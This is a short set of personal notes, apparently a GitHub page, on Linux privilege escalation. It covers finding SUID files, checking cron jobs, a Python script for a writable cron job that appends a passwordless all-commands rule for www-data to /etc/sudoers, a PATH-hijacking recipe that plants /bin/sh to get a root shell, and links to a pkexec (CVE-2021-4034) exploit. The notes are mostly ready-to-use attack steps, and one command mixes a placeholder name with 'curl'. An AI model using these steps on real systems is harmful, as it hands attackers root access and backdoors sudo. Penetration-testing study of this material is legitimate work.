### PRIVESC notes

### suid bits
- Finding files with suid bit

      find / -perm -u=s -type f 2</dev/null

### CRON JOBS
  <a href="https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation/">Link to MORE ON CRON JOBS</a>
- Check cronjobs with

       cat /etc/crontab
- Check if the cron job is running with

      service cron status
  
- Script to run if you can write a cronjob script

       import os 
       import sys
       try:
          print("on it")
          os.system("echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
       except:
            print("Didn't work")
            sys.exit()

### PRIVESC WITH PATH VARIABLE MANIPULATION
- If a binary does not detail the path to run another binary e.g not using (/usr/bin/curl) {stating the path}

    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f0562606-ec66-47bb-a419-9293ca0a62f1)

- You can manipulate the path and get a root shell.It should be noted the binary you are exploiting must have a suidbit

      cd /tmp
      echo "/bin/sh" > <binary you eant to attack>
      chmod 700 curl
      export PATH=/tmp:$PATH

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/cf277f1d-1664-4ea8-a1f0-1461101c5006)
   
### Privesc with pkexec(suidbit) ver 0.105(CVE-2021-4034)
   Use this <a href="https://github.com/arthepsy/CVE-2021-4034">exploit</a>
   <a href="https://www.exploit-db.com/exploits/50689">Exploit db's link</a>
